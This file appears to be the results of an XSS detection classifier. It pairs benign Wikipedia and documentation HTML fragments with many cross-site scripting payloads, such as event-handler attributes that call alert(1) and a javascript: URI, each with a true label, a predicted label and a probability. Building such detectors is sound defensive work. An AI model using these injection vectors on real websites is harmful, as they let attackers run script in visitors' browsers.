Unnamed: 0,payload,label,predicted_label,probability
7106,<del onpointerup=alert(1)>XSS</del>,1,1,0.9951224
12113,"<strong oncontextmenu=""alert(1)"">test</strong>",1,1,0.9984324
7260,"<li><a href=""/wiki/Machine_Intelligence_Research_Institute"" title=""Machine Intelligence Research Institute"">Machine Intelligence Research Institute </a> </li>",0,0,0.00014388385
3545,"<dl class=""docutils"">",0,0,0.00080150325
10433,<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,1,1,0.97932684
8679,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
12281,"<ul><li><a href=""/wiki/Concurrent_computing"" title=""Concurrent computing"">Concurrent computing </a> </li>",0,0,0.0003378654
2247,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
1732,"<li id=""cite_note-HintonDengYu2012-248""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-HintonDengYu2012_248-0"">^ </a> </b> ",0,0,0.000109272936
5911,"<li id=""cite_note-261""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-261"">^ </a> </b> ",0,0,0.0001131503
7076,"<noscript onmousedown=""alert(1)"">test</noscript>",1,1,0.99807
13490,"<main onbeforepaste=""alert(1)"" contenteditable>test</main>",1,1,0.9971057
5351,<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>,1,1,0.99712104
1744,"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",1,1,0.99406564
2169,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=4"" title=""Edit section: Challenges"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.207953e-05
11324,"	 </span>. <i>Science </i>. <b>291 </b> (5504): 599–600. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.291.5504.599"">10.1126/science.291.5504.599 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/11229402"">11229402 </a> &#8211; via msu.edu. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Autonomous+mental+development+by+robots+and+animals&amp;rft.volume=291&amp;rft.issue=5504&amp;rft.pages=599-600&amp;rft.date=2001&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.291.5504.599&amp;rft_id=info%3Apmid%2F11229402&amp;rft.aulast=Weng&amp;rft.aufirst=J.&amp;rft.au=McClelland&amp;rft.au=Pentland%2C+A.&amp;rft.au=Sporns%2C+O.&amp;rft.au=Stockman%2C+I.&amp;rft.au=Sur%2C+M.&amp;rft.au=Thelen%2C+E.&amp;rft_id=http%3A%2F%2Fwww.cse.msu.edu%2Fdl%2FSciencePaper.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,6.682391e-06
1801,"<li><a href=""/wiki/Artificial_life"" title=""Artificial life"">Artificial life </a> </li>",0,0,0.00016539158
5872,"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",1,1,0.99683005
4963,<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1,1,0.9966017
10060,"<base onkeypress=""alert(1)"" contenteditable>test</base>",1,1,0.9977777
13329,	 </span>,0,0,6.0303642e-05
9857,"<article onmouseout=""alert(1)"">test</article>",1,1,0.99736565
1587,<noframes onpointerover=alert(1)>XSS</noframes>,1,1,0.9980301
2631,"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",1,1,0.9913615
12642,"  <ul class=""wy-breadcrumbs"">",0,0,8.896473e-05
5912,"	 </span></a></dt><dd>Quickly export your scraped items to a file (XML, CSV, etc).</dd>",0,0,2.1199521e-05
6713,"<li><a href=""/wiki/Citizen_science#Plastics_and_pollution"" title=""Citizen science"">Citizen Science </a> </li>",0,0,0.0001431311
7782,<animatemotion onpointerdown=alert(1)>XSS</animatemotion>,1,1,0.99806875
7244,"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",1,1,0.9927766
11068,<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,1,1,0.99669653
2972,"<colgroup onmouseenter=""alert(1)"">test</colgroup>",1,1,0.9977092
13567,<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,1,1,0.9895094
6572,"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",1,1,0.9975282
4132,<b onpointerover=alert(1)>XSS</b>,1,1,0.997538
11014,"<big onmouseout=""alert(1)"">test</big>",1,1,0.99718446
13010,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
4003,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
9207,"	 <div> </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,0,2.609182e-05
4795,<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1,1,0.9891482
8522,"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></abbr>",1,1,0.99798733
1476,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
1226,"<basefont onmouseenter=""alert(1)"">test</basefont>",1,1,0.9979994
231,<strike onpointerover=alert(1)>XSS</strike>,1,1,0.99780655
770,"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",1,1,0.9947583
179,"<li id=""cite_note-Brain_simulation-153""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Brain_simulation_153-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Brain_simulation_153-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.00011214199
4253,"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,1,0.99618846
11901,"<li id=""cite_note-Transhumanism-411""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Transhumanism_411-0"">^ </a> </b> ",0,0,0.0001196725
12363,"<li><a href=""/wiki/Numerical_analysis"" title=""Numerical analysis"">Numerical analysis </a> </li> </ul>",0,0,0.00011494467
4485,	 </span> 2016 ,0,0,3.6607515e-05
3048,<i onpointerup=alert(1)>XSS</i>,1,1,0.99422204
5815,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
10748,"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",1,1,0.99791765
11506,"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",1,1,0.99650615
10208,<canvas onpointerleave=alert(1)>XSS</canvas>,1,1,0.9977108
11904,"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",1,1,0.9968528
2365,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
1202,<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,1,1,0.99655205
3498,"	 <div id=""Existential_risk_from_artificial_intelligence"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk </a> from <a class=""mw-selflink selflink"">artificial intelligence </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Concepts </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,2.0613295e-06
805,"<li><a href=""/wiki/Future_of_Life_Institute"" title=""Future of Life Institute"">Future of Life Institute </a> </li>",0,0,0.00016782581
10280,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;957 </li>",0,0,0.00015821462
5782,"<li id=""cite_note-:0-53""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-:0_53-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-:0_53-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.00015580578
10925,"<small onkeyup=""alert(1)"" contenteditable>test</small>",1,1,0.9953177
668,<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1,1,0.99653065
4786,"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",1,1,0.99566376
10563,"<h2>Getting help<a class=""headerlink"" href=""#getting-help"" title=""Permalink to this headline"">¶</a></h2>",0,0,0.00013561774
11220,"<p><a href=""/wiki/Financial_institution"" title=""Financial institution"">Financial institutions </a> have long used <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural network </a> systems to detect charges or claims outside of the norm, flagging these for human investigation. The use of AI in <a href=""/wiki/Banking"" class=""mw-redirect"" title=""Banking"">banking </a> can be traced back to 1987 when <a href=""/wiki/Security_Pacific_National_Bank"" class=""mw-redirect"" title=""Security Pacific National Bank"">Security Pacific National Bank </a> in US set-up a Fraud Prevention Task force to counter the unauthorized use of debit cards.<sup id=""cite_ref-314"" class=""reference""><a href=""#cite_note-314"">&#91;303&#93; </a> </sup> Programs like Kasisto and Moneystream are using AI in financial services.",0,0,3.4096458e-06
7767,"<tfoot draggable=""true"" ondragend=""alert(1)"">test</tfoot>",1,1,0.9978865
11345,	 </span> ,0,0,5.1390383e-05
914,<input3 onpointerleave=alert(1)>XSS</input3>,1,1,0.9946816
11770,javascript:document.location='http://www.google.com/,1,1,0.9966921
288,"<track onmouseleave=""alert(1)"">test</track>",1,1,0.9980335
5225,"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",1,1,0.9971884
6048,	 </span> 2015 ,0,0,4.4052955e-05
7128,"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",1,1,0.9979875
9897,"<li><a href=""/wiki/General-purpose_computing_on_graphics_processing_units"" title=""General-purpose computing on graphics processing units"">GPGPU </a> </li>",0,0,0.00020324434
1577, </li>,0,0,0.00012413738
11510,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485425
4614,          </div>,0,0,4.8152167e-05
9030,"<div role=""navigation"" class=""navbox authority-control"" aria-labelledby=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" style=""padding:3px""><table class=""nowraplinks hlist navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th id=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Help:Authority_control"" title=""Help:Authority control"">Authority control </a> <a href=""https://www.wikidata.org/wiki/Q11660"" title=""Edit this at Wikidata""><img alt=""Edit this at Wikidata"" src=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/10px-OOjs_UI_icon_edit-ltr-progressive.svg.png"" decoding=""async"" width=""10"" height=""10"" style=""vertical-align: text-top"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/15px-OOjs_UI_icon_edit-ltr-progressive.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/20px-OOjs_UI_icon_edit-ltr-progressive.svg.png 2x"" data-file-width=""20"" data-file-height=""20"" /> </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,2.994307e-06
8705,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 4.2, 7.2 </li> </ul>",0,0,0.00013554315
4659,"<video onmouseup=""alert(1)"">test</video>",1,1,0.9971856
10292,"<main oncut=""alert(1)"" contenteditable>test</main>",1,1,0.997069
8601,"<button onkeypress=""alert(1)"" contenteditable>test</button>",1,1,0.9982585
9957,"<li><a href=""/wiki/List_of_artificial_intelligence_projects"" title=""List of artificial intelligence projects"">Projects </a> </li>",0,0,0.00016710343
6640, ,0,0,0.0009942207
12669,"<head onclick=""alert(1)"">test</head>",1,1,0.95088506
3206, </li>,0,0,0.00012413738
9607,<svg><tt onload=alert(1)></tt>,1,1,0.997662
10312,"<nav onkeypress=""alert(1)"" contenteditable>test</nav>",1,1,0.99764884
11251,"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,1,0.99562293
12012,"	 </span> <span class=""reference-text""><cite class=""citation book""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart </a> (8 October 2019). <a href=""/wiki/Human_Compatible"" title=""Human Compatible""><i>Human Compatible: Artificial Intelligence and the Problem of Control </i> </a>. United States: Viking. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-525-55861-3"" title=""Special:BookSources/978-0-525-55861-3""><bdi>978-0-525-55861-3 </bdi> </a>. <a href=""/wiki/OCLC"" title=""OCLC"">OCLC </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/oclc/1083694322"">1083694322 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Human+Compatible%3A+Artificial+Intelligence+and+the+Problem+of+Control&amp;rft.place=United+States&amp;rft.pub=Viking&amp;rft.date=2019-10-08&amp;rft_id=info%3Aoclcnum%2F1083694322&amp;rft.isbn=978-0-525-55861-3&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,3.511059e-06
7168,"	<h3 id=""p-namespaces-label"">Namespaces </h3>",0,0,5.860266e-05
1383,"<rb onmousemove=""alert(1)"">test</rb>",1,1,0.9980925
2772,"<tfoot onmouseover=""alert(1)"">test</tfoot>",1,1,0.9980899
8142,<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,1,1,0.99759805
4572,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
13023,"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",1,1,0.99789035
11055,<svg><em onload=alert(1)></em>,1,1,0.99721694
12457,"<div class=""thumb tright"">",0,0,0.0022409852
1229,<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,1,1,0.9970315
6607,"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",1,1,0.9974989
93,<ul onpointerenter=alert(1)>XSS</ul>,1,1,0.9941321
1858,"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>",1,1,0.9980558
679,"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",1,1,0.99564636
10215,"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",1,1,0.9979871
11127,"<ul><li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge reasoning </a> </li>",0,0,0.0001968317
9891,<multicol onpointerleave=alert(1)>XSS</multicol>,1,1,0.995263
10237,"<param oncontextmenu=""alert(1)"">test</param>",1,1,0.998184
28,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
1693,"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",1,1,0.99750274
12374,<details id=x tabindex=1 onactivate=alert(1)></details>,1,1,0.99459267
412,<svg><blockquote onload=alert(1)></blockquote>,1,1,0.9971259
8466,<samp onpointerenter=alert(1)>XSS</samp>,1,1,0.99793637
10119,"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_4-234""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_4_234-0"">^ </a> </b> ",0,0,0.00011728113
9639,"<svg onmousemove=""alert(1)"">test</svg>",1,1,0.9980192
1817,<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1,1,0.97840226
10067,<blockquote onpointerleave=alert(1)>XSS</blockquote>,1,1,0.99719465
11008,	 </span> </h3>,0,0,4.0975585e-05
3720,"<th onmouseleave=""alert(1)"">test</th>",1,1,0.9955174
6830,<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>,1,1,0.9973906
5936,"<source onmousedown=""alert(1)"">test</source>",1,1,0.99802417
7430,"<li id=""cite_note-Intelligent_agents-179""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Intelligent_agents_179-0"">^ </a> </b> ",0,0,0.000108546694
7053,"<html oncopy=""alert(1)"" contenteditable>test</html>",1,1,0.99348676
1888,"<applet onmouseleave=""alert(1)"">test</applet>",1,1,0.996826
5448,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Neumann, Bernd; Möller, Ralf (January 2008). ""On scene interpretation with description logics"". <i>Image and Vision Computing </i>. <b>26 </b> (1): 82–101. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.imavis.2007.08.013"">10.1016/j.imavis.2007.08.013 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Image+and+Vision+Computing&amp;rft.atitle=On+scene+interpretation+with+description+logics&amp;rft.volume=26&amp;rft.issue=1&amp;rft.pages=82-101&amp;rft.date=2008-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.imavis.2007.08.013&amp;rft.aulast=Neumann&amp;rft.aufirst=Bernd&amp;rft.au=M%C3%B6ller%2C+Ralf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,1.5368331e-06
8906, </li>,0,0,0.00012413738
13665,<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1,1,0.99596
13640,	 </span>,0,0,6.0303642e-05
7030,"<button onmouseup=""alert(1)"">test</button>",1,1,0.9982951
6382,	 </span> </li>,0,0,4.039223e-05
3953,<textarea onpointerdown=alert(1)>XSS</textarea>,1,1,0.9983888
1354,<canvas id=x tabindex=1 onfocus=alert(1)></canvas>,1,1,0.9969279
5123,"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",1,1,0.9975141
3026,  </script>,0,0,0.00016870021
9776,<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1,1,0.99558944
10932,"  <div role=""contentinfo"">",0,0,0.00019082591
2358,"  <ul class=""wy-breadcrumbs"">",0,0,8.896473e-05
